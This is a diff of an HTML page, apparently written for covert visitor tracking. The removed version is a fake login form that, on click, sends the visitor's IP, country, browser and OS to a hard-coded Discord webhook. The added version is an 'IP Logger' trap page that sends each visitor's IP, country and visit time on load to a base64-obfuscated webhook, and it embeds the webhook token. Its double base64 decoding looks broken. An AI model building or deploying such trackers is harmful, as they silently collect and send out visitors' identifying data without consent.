@@ -1,56 +1,58 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Мой сайт</title>
-  </head>
-  <body>
-    <h1>Добро пожаловать!</h1>
-
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<head>
+    <title>IP Logger</title>
     <script>
-      const webhookUrl = 'https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0';
-
-      function sendToWebhook(data) {
-        axios.post(webhookUrl, {
-          embeds: [{
-            title: 'Новый пользователь!',
-            description: 'IP-адрес: ' + data.ip + '\nБраузер: ' + data.browser + '\nСтрана: ' + data.country + '\nОС: ' + data.os,
-          }]
-        });
-      }
-
-      function collectData() {
-        const data = {
-          ip: null,
-          browser: null,
-          country: null,
-          os: null,
-        };
-
-        axios.get('https://api.ipify.org?format=json')
-          .then(response => {
-            data.ip = response.data.ip;
-            return axios.get('https://ipapi.co/' + data.ip + '/json/');
-          })
-          .then(response => {
-            data.country = response.data.country_name;
-            data.browser = navigator.userAgent;
-            data.os = navigator.platform;
-
-            sendToWebhook(data);
-          })
-          .catch(error => console.error(error));
-      }
-
-      document.querySelector('#login-button').addEventListener('click', () => {
-        collectData();
-        // здесь можно добавить код для обработки логина пользователя
-      });
+        var webhook_url = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MzY0MTEzMjY3MzU5NzU2Mjo5bzFOcTE4eFpSS01pVDRxVXNqSXhfbDAyQ3BhVGR6VTJTZDVLMTVrZlJqY3hpZVhrLXVMZEp0amVpT1VoYW5DM3Iw"); // замените на свой Discord Webhook в зашифрованном виде
     </script>
-
-    <input type="text" placeholder="Имя пользователя">
-    <input type="password" placeholder="Пароль">
-    <button id="login-button">Войти</button>
-  </body>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js" integrity="sha512-T5rJ7hDx8Wp33VDbvIZhKj7b9zQkZ5QxtgvvLwU5OoD5eBc85+oZHvIWq3qKjX1fHn0AfoSyuwYFuxgR0GKsBg==" crossorigin="anonymous"></script>
+    <script>
+        $.get("https://ipapi.co/json/", function(data) {
+            var webhook_decoded = atob(webhook_url);
+            var ip = data.ip;
+            var country = data.country_name;
+            var time = moment().format('MMMM Do YYYY, h:mm:ss a');
+            var request = new XMLHttpRequest();
+            request.open("POST", webhook_decoded);
+            request.setRequestHeader('Content-type', 'application/json');
+            var params = {
+                username: "IP Logger",
+                avatar_url: "https://i.imgur.com/WzAMxKl.png",
+                embeds: [
+                    {
+                        title: "IP-адрес залогирован",
+                        description: "Бебра",
+                        color: 16711680,
+                        fields: [
+                            {
+                                name: "IP",
+                                value: ip,
+                                inline: true
+                            },
+                            {
+                                name: "Страна",
+                                value: country,
+                                inline: true
+                            },
+                            {
+                                name: "Время посещения",
+                                value: time
+                            }
+                        ],
+                        timestamp: new Date(),
+                        footer: {
+                            text: "IP Logger"
+                        }
+                    }
+                ]
+            };
+            request.send(JSON.stringify(params));
+        });
+    </script>
+</head>
+<body>
+    <h1>Бебра</h1>
+    <p>Это сайт-ловушка, который будет записывать IP-адреса, страны и время посещения людей, которые посещают его.</p>
+</body>
 </html>
